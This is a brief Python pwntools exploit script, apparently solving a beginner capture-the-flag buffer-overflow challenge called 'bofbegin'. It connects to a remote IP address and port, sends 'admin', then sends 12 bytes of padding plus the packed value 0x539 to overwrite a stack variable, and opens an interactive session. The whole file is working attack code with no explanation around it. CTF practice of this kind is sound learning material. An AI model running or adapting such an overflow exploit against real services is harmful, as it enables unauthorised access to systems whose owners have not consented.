#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./bofbegin')

#p = process()
p = remote('61.14.233.78',2112)


p.sendline(b'admin')
p.sendline(b'a'*12 + p64(0x0000000000000539))
p.interactive()
